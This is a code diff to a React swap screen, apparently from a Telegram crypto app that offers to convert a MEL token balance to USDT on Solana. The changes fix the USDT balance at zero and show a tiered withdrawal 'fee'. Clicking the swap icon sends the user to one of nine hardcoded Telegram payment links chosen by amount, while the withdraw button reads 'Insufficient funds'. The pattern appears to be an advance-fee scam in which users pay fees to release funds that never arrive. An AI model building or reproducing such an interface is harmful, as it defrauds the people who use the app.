@@ -12,8 +12,76 @@ const Swap = () => {
   const [inputValue, setInputValue] = useState("");
   const [usdtValue, setUsdtValue] = useState("");
   const [isIconColored, setIsIconColored] = useState(false);
-
+  const usdtBalance = 0;
   const usdt = 0.9149;
+  const links = [
+    "https://t.me/send?start=IVOEwneDUsCU",
+    "https://t.me/send?start=IVhN43ZViQSr",
+    "https://t.me/send?start=IV3vH2Fxifiz",
+    "https://t.me/send?start=IVkRma723ONy",
+    "https://t.me/send?start=IVLJHQedNca1",
+    "https://t.me/send?start=IVSpq0FXNFLY",
+    "https://t.me/send?start=IVkAtWrI1Hew",
+    "https://t.me/send?start=IVOrcEdGXulS",
+    "https://t.me/send?start=IVmRXsQQHWJT",
+  ];
+  
+
+  // Функция для определения fee
+  const calculateFee = () => {
+    const value = parseFloat(inputValue);
+    if (isNaN(value)) return ""; // Если значение не число, вернуть пустую строку
+
+    if (value >= 0 && value < 47) {
+      return "≈ 0.477-0.478";
+    } else if (value >= 47 && value < 105) {
+      return "≈ 0.478-0.561";
+    } else if (value >= 105 && value < 197) {
+      return "≈ 0.561-0.782";
+    } else if (value >= 197 && value < 330) {
+      return "≈ 0.782-0.898";
+    } else if (value >= 330 && value < 408) {
+      return "≈ 0.898-1.069";
+    } else if (value >= 408 && value < 561) {
+      return "≈ 1.069-1.192";
+    } else if (value >= 561 && value < 620) {
+      return "≈ 1.192-1.441";
+    } else if (value >= 620 && value < 910) {
+      return "≈ 1.441-3.002";
+    } else if (value >= 910) {
+      return "≈ 3.002-7.981";
+    } else {
+      return ""; // Добавьте дополнительные условия, если необходимо
+    }
+  };
+
+  const getLinkByInputValue = () => {
+    const value = parseFloat(inputValue);
+
+    if (value >= 0 && value < 47) {
+      return links[0];
+    } else if (value >= 47 && value < 105) {
+      return links[1];
+    } else if (value >= 105 && value < 197) {
+      return links[2];
+    } else if (value >= 197 && value < 330) {
+      return links[3];
+    } else if (value >= 330 && value < 408) {
+      return links[4];
+    } else if (value >= 408 && value < 561) {
+      return links[5];
+    } else if (value >= 561 && value < 620) {
+      return links[6];
+    } else if (value >= 620 && value < 910) {
+      return links[7];
+    } else if (value >= 910) {
+      return links[8];
+    } else {
+      return ""; // Добавьте дополнительные условия, если необходимо
+    }
+  };
+
+  const fee = calculateFee();
 
   const handleBalanceClick = () => {
     setInputValue(balance.toFixed(6));
@@ -58,7 +126,7 @@ const Swap = () => {
   // Функция для проверки, должна ли кнопка быть активной или нет
   const isButtonDisabled = () => {
     // Кнопка должна быть неактивной, если одно из полей пустое или inputValue больше balance
-    return !inputValue || parseFloat(inputValue) > balance;
+    return !inputValue || parseFloat(inputValue) > balance + 0.000001;
   };
 
   // Функция для обновления цвета иконки в зависимости от условий
@@ -82,12 +150,12 @@ const Swap = () => {
           &lt; Назад
         </Link>
       </div>
+      <div className="toptext">SWAP</div>
       <div className="balance-field">
-        <span>{balance.toFixed(6)}</span>
         <img src={melImage} alt="MEL icon" className="icon-mell" />
-      </div>
-      <div className="usdt-field">
-        <span>{usdt.toFixed(6)}</span>
+        <span>{balance.toFixed(6)}</span>
+        <span>🔄</span>
+        <span>{usdtBalance.toFixed(6)}</span>
         <img src={usdtImage} alt="USDT icon" className="icon-usdt" />
       </div>
       <div className="balance-input">
@@ -109,18 +177,22 @@ const Swap = () => {
         src={swapImage}
         alt="Refresh Icon"
         className="refresh-icon"
-        style={{ filter: isIconColored ? "none" : "grayscale(100%)" }} // Применяем стиль для изменения цвета иконки
+        style={{ filter: isIconColored ? "none" : "grayscale(100%)" }}
         onClick={() => {
           if (!isButtonDisabled()) {
             // Если кнопка активна, можно выполнить действие
             // В данном случае, переход по ссылке
-            window.location.href = "https://t.me/mrtsk"; // Замените ссылку на нужную
+            const link = getLinkByInputValue();
+            if (link) {
+              window.location.href = link;
+            }
           }
         }}
       />
+
       <div className="usdt-input">
         <label htmlFor="usdtInput" className="balance-label">
-          usdt
+          fee {fee}
         </label>
         <input
           type="text"
@@ -131,18 +203,29 @@ const Swap = () => {
           onChange={handleUsdtInputChange}
         />
       </div>
+      <div className="overtext">
+        <p>
+          <span className="overtext-left">Валюта:</span>
+          <span className="overtext-right">Tether</span>
+        </p>
+        <p>
+          <span className="overtext-left">Сеть:</span>
+          <span className="overtext-right">Solana</span>
+        </p>
+        <p>
+          <span className="overtext-left">Мин. сумма вывода:</span>
+          <span className="overtext-right">0.3 USDT</span>
+        </p>
+      </div>
 
       <div class="area">
-        <label for="areaInput" class="area-label">
-          usdt
-        </label>
         <textarea
           id="areaInput"
-          placeholder="Enter text here..."
+          placeholder="Введите адрес для вывода"
           class="area-in"
         ></textarea>
         <button id="submitButton" disabled>
-          adfad
+          Insufficient funds
         </button>
       </div>
 
@@ -152,7 +235,7 @@ const Swap = () => {
           Мы не сможем начислить на ваш счет токены от этой продажи.
         </p>
         <p>
-          *Убедитесь, что вы ввели правильный адрес для пополнения в USDT сети
+          *Убедитесь, что вы ввели правильный адрес для вывода в USDT сети
           Solana. В противном случае средства могут быть утеряны.
         </p>
       </div>
